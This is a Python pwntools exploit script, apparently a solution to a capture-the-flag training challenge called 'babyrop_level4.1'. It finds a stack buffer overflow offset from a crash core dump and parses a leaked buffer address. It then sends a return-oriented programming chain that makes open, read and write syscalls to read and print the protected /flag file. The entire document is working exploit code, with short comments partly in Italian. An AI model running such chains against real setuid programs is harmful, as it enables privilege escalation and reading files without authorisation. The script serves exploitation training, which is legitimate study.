#!/usr/bin/python3
from pwn import *

# INITIALIZATION
context.arch = 'amd64'
context.log_level = 'CRITICAL'

# Load the ELF binary
elf = ELF('/challenge/babyrop_level4.1')
rop = ROP(elf)

## Calculating buffer length
# Create a process to determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))
io.wait()

# Find the offset where the cyclic pattern overwrites the return address
buffer_len = cyclic_find(io.corefile.fault_addr, n=8)

## Starting the exploit
# Create a new process for the exploit
io = elf.process()
io.recvuntil(b'located at: 0x')
buffer_addr = p64(int(io.recvuntil(b'.')[:-1], 16))

## Crafting ROP Chain

# versione alternativa di 4.0 qui invece che dare permessi apro il file 
# lo leggo e poi stampo
CHAIN = (
    # open("/flag", 0)
    p64(rop.rax.address) + p64(2) +               # rax = 2 (syscall open)
    p64(rop.rdi.address) + buffer_addr +          # rdi = pointer to "/flag"
    p64(rop.rsi.address) + p64(0) +               # rsi = O_RDONLY (0)
    p64(rop.syscall.address) +                    # syscall

    # read(3, buffer_addr + 0x100, 100)
    p64(rop.rax.address) + p64(0) +               # rax = 0 (syscall read)
    p64(rop.rdi.address) + p64(3) +               # rdi = fd (assume 3)
    p64(rop.rsi.address) + buffer_addr +  # rsi = buffer to store flag
    p64(rop.rdx.address) + p64(100) +             # rdx = size
    p64(rop.syscall.address) +                    # syscall

    # write(1, buffer_addr + 0x100, 100)
    p64(rop.rax.address) + p64(1) +               # rax = 1 (syscall write)
    p64(rop.rdi.address) + p64(1) +               # rdi = stdout
    p64(rop.rsi.address) + buffer_addr +  # rsi = buffer
    p64(rop.rdx.address) + p64(100) +             # rdx = size
    p64(rop.syscall.address)                      # syscall
)


# Construct the payload with the ROP chain
PAYLOAD = b'/flag\x00' + b'A' * (buffer_len - 6) + CHAIN

# Send the payload to the binary
io.sendline(PAYLOAD)

# Print the output received from the binary

io.interactive()
